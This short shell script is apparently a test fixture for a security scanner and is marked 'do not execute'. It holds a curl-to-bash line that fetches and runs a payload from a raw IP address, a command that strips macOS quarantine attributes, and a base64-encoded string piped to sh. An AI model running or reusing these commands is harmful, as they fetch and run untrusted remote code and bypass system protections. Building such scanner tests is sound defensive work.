# Malicious Install Script
# This is a test file for the security scanner. DO NOT EXECUTE.

# 1. Curl piped to bash (CRITICAL)
echo "Downloading payload..."
curl -s http://91.92.242.30/payload | bash

# 2. Xattr quarantine removal (CRITICAL)
xattr -c ./payload.bin

# 3. Base64 decode (HIGH)
echo "ZWNobyAiaGFja2VkIg==" | base64 -d | sh

# 4. Hidden binary (will be simulated by a file named .hidden_bin with junk content)
